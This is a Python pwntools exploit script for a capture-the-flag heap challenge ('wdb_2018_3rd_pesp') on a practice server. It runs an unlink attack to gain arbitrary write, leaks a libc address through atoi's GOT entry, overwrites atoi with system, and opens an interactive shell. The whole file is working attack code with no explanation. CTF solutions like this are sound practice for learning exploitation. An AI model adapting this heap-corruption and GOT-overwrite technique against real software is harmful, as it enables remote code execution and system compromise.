#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/07/30 12:34:51
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = 'amd64'
file_name = "./wdb_2018_3rd_pesp"
menu = "Your choice:"
if context.arch == "amd64":
    libc_path = "/lib/x86_64-linux-gnu/libc.so.6"
    one_offset = [0x45226,0x4527a,0xf03a4,0xf1247]
    # libc_path = "../../libc/16-64-libc-2.23.so"
    # one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
else:
    # libc_path = "../../libc/16-32-libc-2.23.so"
    libc_path = "/lib/i386-linux-gnu/libc.so.6"
libc = ELF(libc_path)
if debug:
    if context.arch == "amd64":
        # sh = process([file_name],env={'LD_PRELOAD':libc_path})
        sh = process(file_name)
    else:
        # sh = process([file_name],env={'LD_PRELOAD':libc_path})
        sh = process(file_name)
else:
    IP = "node4.buuoj.cn"
    port = 29236
    sh = remote(IP,port)
ptr = 0x6020c0
elf = ELF(file_name)
def debug():
    gdb.attach(sh)
    pause()
def cmd(choice):
    sh.recvuntil(menu)
    sh.sendline(str(choice))


def show():
    cmd(1)

def add(size,content):
    cmd(2)
    sh.recvuntil("Please enter the length of servant name:")
    sh.sendline(str(size))
    sh.recvuntil("Please enter the name of servant:")
    sh.send(content)

def edit(idx,content):
    cmd(3)
    sh.recvuntil("Please enter the index of servant:")
    sh.sendline(str(idx))
    sh.recvuntil("Please enter the length of servant name:")
    sh.sendline(str(len(content)))
    sh.recvuntil("Please enter the new name of the servnat:")
    sh.send(content)

def dele(idx):
    cmd(4)
    sh.recvuntil("Please enter the index of servant:")
    sh.sendline(str(idx))

add(0x38,'aaaa')
add(0xf0,'aaaa')
add(0x10,'aaaa')
payload = p64(0) + p64(0x31) + p64(ptr+8-0x18) + p64(ptr+8-0x10) + 'a' * 0x10 + p64(0x30)
edit(0,payload)
dele(1)
payload = p64(0) *2 + p64(8) + p64(ptr+8) + p64(8) + p64(elf.got['atoi'])
edit(0,payload)
show()
atoi_addr = u64(sh.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
libc_base = atoi_addr - libc.symbols['atoi']
system_addr = libc_base + libc.symbols['system']
log.info("libc_base=>{}".format(hex(libc_base)))
edit(1,p64(system_addr))
sh.sendline("/bin/sh\x00")
# debug()
sh.interactive()